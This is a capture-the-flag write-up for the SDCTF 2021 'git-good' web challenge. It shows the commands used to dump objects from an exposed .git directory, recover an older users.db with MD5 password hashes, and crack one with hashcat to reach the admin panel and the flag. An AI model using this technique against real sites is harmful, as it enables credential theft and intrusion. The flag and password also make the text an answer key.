# git-good - SDCTF 2021

One of the web challenges of SDCTF 2021 was "git-good", where we are given the story

> We've been issued a challenge by the primary competing cyber organization on campus,
> the Cybersecurity Group at UCSD.
> You have been granted permission to try and hack into their admin portal to steal their flag.
> They've been hardening their website for some time now, and they said they think its "unhackable".
> Show them how wrong they are!

and the link `https://cgau.sdc.tf/`
([Web Archive](https://web.archive.org/web/20210516124135/https://cgau.sdc.tf/)).

## The vulnerability

The challenge name "git-good" implied that the website's git repository was unprotected.
That is, the `.git` directory was publicly accessible in the webroot.
However, when an attempt was made to access the directory it was found that directory autoindexing
(a common security hole) was disabled:

```
Cannot GET /.git/
```

so the task was made more difficult by the necessity of knowing which paths to `GET` in advance.

## Getting the HEAD

Knowing that `.git` directories follow a common structure, a new git repository was created locally
and examined:

```bash
$ ls
branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
```

we know from git documentation that the `HEAD` of the repository is the currently checked-out version
of the tracked files, so we follow the references:

```bash
$ cat HEAD
ref: refs/heads/master
$ cat refs/heads/master
# Commit hash here
```

doing this on the website led to the following commit hash:

```bash
$ curl https://cgau.sdc.tf/.git/refs/heads/master
0b23360a5d79ecf5241fd6790edd619304825b9a
```

where the hash is a reference to a file stored in the `objects` directory.

## Git objects

The file is found in a subdirectory named after the first two characters of the hash
and is named after the remaining characters of the hash.
Each file storing a git object is zlib compressed.
The commit hash above leads to:

```bash
$ curl https://cgau.sdc.tf/.git/objects/0b/23360a5d79ecf5241fd6790edd619304825b9a | zlib-flate -uncompress
commit 217tree 426ec68a64f6fe89ec40a3352213703792e080cb
parent d8eb39e3e2bb984ce687768d20f58d962942841d
author Aaron <aaron@cgau.sdc.tf> 1610830733 -0800
committer KNOXDEV <nick@knox.codes> 1610831055 -0800

Upgraded to bcrypt
```

where "upgraded to bcrypt" is probably a reference to a database of password hashes for the website's
admin panel. If the hashing algorithm was "upgraded" to bcrypt, then it must previously have been a
weaker algorithm. This is important, because bcrypt is a reasonably secure, recommended hash algorithm.
Most importantly, bcrypt hashes are salted, meaning we will not be able to use precomputed tables
of hash values to crack the passwords. This means cracking the bcrypt hashes is not feasible during the
timeframe of the competition. The previous commit referenced by the `parent` hash
will contain the old hashes:

```bash
$ curl https://cgau.sdc.tf/.git/objects/d8/eb39e3e2bb984ce687768d20f58d962942841d | zlib-flate -uncompress
commit 165tree 7e23e8d425a5f91a7f5e70d6c7cc6d7811db661d
author Aaron <aaron@cgau.sdc.tf> 1610830369 -0800
committer KNOXDEV <nick@knox.codes> 1610831041 -0800

Initial commit
$ curl https://cgau.sdc.tf/.git/objects/7e/23e8d425a5f91a7f5e70d6c7cc6d7811db661d | zlib-flate -uncompress
# Binary data
```

Following the commit's tree hash leads to some binary data
in [a specific git tree format](https://www.dulwich.io/docs/tutorial/file-format.html#the-tree).
Most importantly, this format contains file names and hashes of the corresponding git object.
The file names contained in the tree are:

```
.gitignore
admin.html
app.js
image1.png
index.html
package-lock.json
package.json
robots.txt
users.db
```

and we can clearly see that the admin panel is located at `admin.html`
([Web Archive](http://web.archive.org/web/20210516132225/https://cgau.sdc.tf/admin.html))
and the users database with the password hashes is `users.db`.
Following the corresponding object hash gives:

```bash
$ curl https://cgau.sdc.tf/.git/objects/7e/23e8d425a5f91a7f5e70d6c7cc6d7811db661d | zlib-flate -uncompress | tail -c 20 test3_uncomp | xxd -p
84f191442c8479c4cbd67937b9cbe3df2038be63
$ curl https://cgau.sdc.tf/.git/objects/84/f191442c8479c4cbd67937b9cbe3df2038be63 | zlib-flate -uncompress
# Binary data
```

binary data in [git blob format](https://www.dulwich.io/docs/tutorial/file-format.html#the-blob),
which is just a brief null-terminated blob header followed by the file content. In this case:

```
blob 8192^@SQLite format 3
```

the file is a SQLite database, and stripping out the header results in the original `users.db` file.
Uploading this to [an online SQLite database viewer](https://inloop.github.io/sqlite-viewer/)
gives the following table:

| id | email | password |
| -------- | -------- | -------- |
| 1 | `aaron@cgau.sdc.tf` | `e04efcfda166ec49ba7af5092877030e` |
| 2 | `chris@cgau.sdc.tf` | `c7c8abd4980ff956910cc9665f74f661` |
| 3 | `yash@cgau.sdc.tf` | `b4bf4e746ab3f2a77173d75dd18e591d` |
| 4 | `rj@cgau.sdc.tf` | `5a321155e7afbf0cfacf1b9d22742889` |
| 5 | `shawn@cgau.sdc.tf` | `a8252b3bbf4f3ed81dbcdcca78c6eb35` |

where each hash is 32 hexadecimal digits long, which is 16 bytes (128 bits).
This suggests that the hash algorithm is MD5.
Alternatively, the emails and corresponding hashes could have also been
obtained by running `strings` on the SQLite file.

## Cracking the hashes

Running [the latest version of hashcat](https://hashcat.net/hashcat/) using the
[rockyou.txt wordlist](https://github.com/brannondorsey/naive-hashcat/releases/)
on the hashes gives:

```bash
$ cat hashes
e04efcfda166ec49ba7af5092877030e
c7c8abd4980ff956910cc9665f74f661
b4bf4e746ab3f2a77173d75dd18e591d
5a321155e7afbf0cfacf1b9d22742889
a8252b3bbf4f3ed81dbcdcca78c6eb35
$ ./hashcat.bin -m 0 hashes rockyou.txt
# Output
$ cat hashcat.potfile 
e04efcfda166ec49ba7af5092877030e:weakpassword
```

so logging in as `aaron@cgau.sdc.tf` with password `weakpassword`
on the admin panel gives flag `sdctf{1298754_Y0U_G07_g00D!}`.
